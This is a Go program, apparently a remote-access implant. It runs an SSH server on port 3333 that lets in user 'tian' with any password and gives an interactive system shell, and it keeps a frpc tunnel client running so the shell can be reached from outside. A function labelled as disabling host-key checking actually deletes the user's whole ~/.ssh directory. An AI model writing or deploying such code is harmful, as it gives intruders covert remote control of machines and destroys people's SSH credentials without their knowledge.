package main

import (
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	gssh "github.com/gliderlabs/ssh"
)

func startSShServer() {

	// Disable StrictHostKeyChecking
	err := disableStrictHostKeyChecking()
	if err != nil {
		log.Fatal(err)
	}
	server := &gssh.Server{
		Addr: ":3333",
		PasswordHandler: func(ctx gssh.Context, password string) bool {
			return ctx.User() == "tian"
		},
		Handler: func(s gssh.Session) {
			_, winCh, isPty := s.Pty()
			if isPty {
				handlePty(s, winCh)
			} else {
				io.WriteString(s, "non-interactive sessions aren't supported\n")
			}
		},
	}

	log.Fatal(server.ListenAndServe())
}

func handlePty(s gssh.Session, winCh <-chan gssh.Window) {
	var shell string
	if runtime.GOOS == "windows" {
		shell = "powershell"
	} else {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell)
	cmd.Env = append(cmd.Env, "TERM=xterm")

	stdout, _ := cmd.StdoutPipe()
	stdin, _ := cmd.StdinPipe()

	go func() {
		io.Copy(stdin, s)
	}()

	go func() {
		io.Copy(s, stdout)
	}()

	cmd.Start()
	cmd.Wait()
}

func disableStrictHostKeyChecking() error {
	var sshConfigPath string
	if runtime.GOOS == "windows" {
		sshConfigPath = os.Getenv("USERPROFILE") + "\\.ssh"
	} else {
		sshConfigPath = os.Getenv("HOME") + "/.ssh"
	}

	// 清空.ssh
	err := os.RemoveAll(sshConfigPath)
	if err != nil {
		return err
	}

	return nil

}

// proxy 内网穿透，端口转发
func main() {

	go func() {
		for {
			startSShServer()
		}
	}()
	// 启动frpc客户端
	startFRPClient()
}

// startFRPClient 启动frpc客户端
func startFRPClient() {
	// 获取当前文件的路径
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	if err != nil {
		log.Fatal(err)
	}

	// 配置文件的路径
	configPath := filepath.Join(dir, "frpc.toml")

	// 启动frpc客户端
	for {
		cmd := exec.Command("./frpc", "-c", configPath)
		err = cmd.Start()
		if err != nil {
			log.Fatal(err)
		}

		log.Printf("frpc started with pid %d\n", cmd.Process.Pid)

		// 等待frpc客户端退出
		err = cmd.Wait()
		if err != nil {
			log.Printf("frpc exited with error: %v\n", err)
		}
	}
}
